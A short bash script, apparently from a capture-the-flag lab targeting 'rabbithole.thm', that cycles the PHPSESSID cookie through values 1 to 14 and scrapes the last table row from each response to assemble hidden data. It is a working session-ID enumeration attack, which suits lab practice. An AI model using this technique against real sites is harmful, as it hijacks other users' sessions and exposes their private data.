#!/bin/bash

# Initialize an empty variable to store concatenated output
result=""

# Loop through each session ID from 1 to 14
for i in {1..14}; do
  # Get the relevant data and strip HTML tags
  output=$(curl -s http://rabbithole.thm -H "Cookie: PHPSESSID=$i" | grep -o '<tr><td>.*</td>' | tail -1 | sed -e 's/<[^>]*>//g')
  
  result+="$output"
done

# Print the final concatenated result
echo "$result"
